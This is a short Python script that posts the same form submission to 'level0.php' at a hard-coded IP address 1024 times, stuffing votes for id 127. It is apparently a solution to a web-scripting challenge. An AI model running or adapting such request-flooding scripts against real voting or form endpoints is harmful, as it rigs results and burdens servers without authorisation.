#!/usr/bin/python3
import requests
url = 'http://158.69.76.135/level0.php'
data = {
    'id': '127',
    'holdthedoor': 'Submit'
}
for i in range(1024):
    requests.post(url, data=data)
